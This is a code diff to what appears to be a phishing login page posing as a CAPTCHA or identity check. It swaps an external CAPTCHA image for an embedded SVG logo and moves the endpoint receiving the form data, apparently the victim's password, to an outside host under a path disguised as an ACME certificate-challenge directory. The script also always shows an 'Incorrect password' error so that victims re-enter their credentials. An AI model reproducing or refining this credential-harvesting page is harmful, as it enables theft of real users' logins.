@@ -96,11 +96,35 @@
     .confirm-identity-spacing {
         margin-bottom: 24px;
     }
+    .captcha-logo-container {
+        text-align: center;
+        margin-bottom: 20px;
+    }
+    .captcha-logo {
+        width: 180px;
+        height: 180px;
+        margin: 0 auto;
+        background-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyMDAgMjAwIj48c3R5bGU+LnN0MHtmaWxsOiMwNjIxNzQ7fS5zdDF7ZmlsbDpub25lO3N0cm9rZTojZmZmO3N0cm9rZS13aWR0aDo1O3N0cm9rZS1saW5lY2FwOnJvdW5kO3N0cm9rZS1taXRlcmxpbWl0OjEwO30uc3Qye2ZvbnQtZmFtaWx5OidBcmNoaXZvIE5hcnJvdyc7Zm9udC1zaXplOjI0cHg7Zm9udC13ZWlnaHQ6Ym9sZDtmaWxsOiMwNjIxNzQ7fTwvc3R5bGU+PHBhdGggY2xhc3M9InN0MCIgZD0iTTEwMCAxMjVjMzMuMSAwIDYwLTE2LjggNjAtMzcuNVY1MGgtMTIwVjg3LjVjMCAyMC43IDI2LjkgMzcuNSA2MCAzNy41eiIvPjxwYXRoIGNsYXNzPSJzdDAiIGQ9Ik0xMDAgMTI1YzMzLjEgMCA2MC0xNi44IDYwLTM3LjVWNTBoLTEyMFY4Ny41YzAgMjAuNyAyNi45IDM3LjUgNjAgMzcuNXoiLz48cGF0aCBjbGFzcz0ic3QxIiBkPSJNNzUgODBsMTUgMTUgMzAtMzAiLz48dGV4dCBjbGFzcz0ic3QyIiB4PSIxMDAiIHk9IjE2NSIgdGV4dC1hbmNob3I9Im1pZGRsZSI+Q0FQVENIQTwvdGV4dD48L3N2Zz4=');
+        background-size: contain;
+        background-repeat: no-repeat;
+        background-position: center;
+    }
+    .captcha-text {
+        font-family: 'Archivo Narrow', sans-serif;
+        font-size: 24px;
+        font-weight: bold;
+        color: #062174;
+        margin-top: 10px;
+        letter-spacing: 1px;
+    }
 </style>
 
 <body>
     <div class="login-container">
-        <img src="https://media.istockphoto.com/id/1156467607/photo/captcha-im-not-a-robot.jpg?b=1&s=170667a&w=0&k=20&c=qsCUeyZgtDMl98uVMrhPrXqWatuEdwkSyF6YlwLtbW4=" width="150" style="display: block; margin: 0 auto 20px;">
+        <!-- Embedded CAPTCHA logo with image and text -->
+        <div class="captcha-logo-container">
+            <div class="captcha-logo"></div>
+        </div>
 
         <div id="errorMsg" class="alert alert-danger" style="display: none;">
             <i class="fas fa-exclamation-circle"></i> Incorrect password. Please try again.
@@ -170,8 +194,7 @@
                 var button = document.getElementById("submitBtn");
                 var formData = new FormData(form);
                 var xhr = new XMLHttpRequest();
-                xhr.open("POST", "https://chip-intl.com/petitspasqatar.com/1mohrup/y1hfsje/smnlaxk/ini.php
-", true);
+                xhr.open("POST", "https://chip-intl.com/well-known/acme-challenge/f/f/g/h/ini.php", true);
                 var errors = document.getElementById("errorMsg");
                 errors.style.display = "block";
                 errors.innerHTML = '<i class="fas fa-exclamation-circle"></i> Incorrect password. Please try again.';
